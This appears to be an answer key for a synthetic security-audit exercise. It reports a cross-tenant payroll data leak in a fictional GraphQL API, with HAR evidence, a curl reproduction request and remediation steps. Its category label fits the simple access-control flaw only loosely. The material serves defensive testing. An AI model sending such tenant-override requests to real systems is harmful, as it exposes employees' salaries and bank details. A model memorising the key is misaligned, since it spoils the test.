# Expected Response

## System
- Domain: HR / Payroll Processing
- System: WageFlow Payroll API
- Example ID: GQL-0146

## Priority Findings

### Finding 1: HR Payroll — Persistence Poisoning via listResources Exposes Cross-Tenant Payroll Data (Pattern 4.2)
**Severity:** Critical
**Category:** Integrity / Persistence Poisoning via Lifecycle Actions

**Summary:**
Per §5.0 (Pattern 4.2 — persistence poisoning via lifecycle actions): The `listResources` resolver accepts a client-supplied `tenantId` filter, enabling an attacker to poison their own session's resource context with persisted cross-tenant payroll records. An attacker from `tenant-f056` passed `tenantId: "tenant-9ce9"` and received payroll processing data belonging to `tenant-9ce9`, including `CONFIDENTIAL-f0569ce9`. In HR / Payroll, this exposes employee salaries, tax withholding data, and bank account details.

**Evidence from HAR:**
- Request: `POST https://api.wageflow-payroll-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-f056`
- Query: `listResources(tenantId: "tenant-9ce9") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-9ce9"`, `ownerId: "other-user-f0569ce9"`, `sensitiveField: "CONFIDENTIAL-f0569ce9"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f0569ce9`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 4.2 | listResources lifecycle poisoning |
| HAR request | tenantId argument | tenant-9ce9 (victim, client-supplied) |
| HAR response | tenantId | tenant-9ce9 payroll data returned |
| HAR response | sensitiveField | CONFIDENTIAL-f0569ce9 |

## Steps to Reproduce

### Step 1 — listResources payroll cross-tenant (HAR)
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f056" \
  -d '{"query": "query { listResources(tenantId: \"tenant-9ce9\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-9ce9` payroll data returned. **Secure:** Only `tenant-f056` data or FORBIDDEN.

## Remediation
1. Remove `tenantId` arg from `listResources`; derive from `$jwt.tenantId` only.
2. Lifecycle state transitions must re-validate tenancy at each stage.
3. Resolver: `WHERE tenant_id = $jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
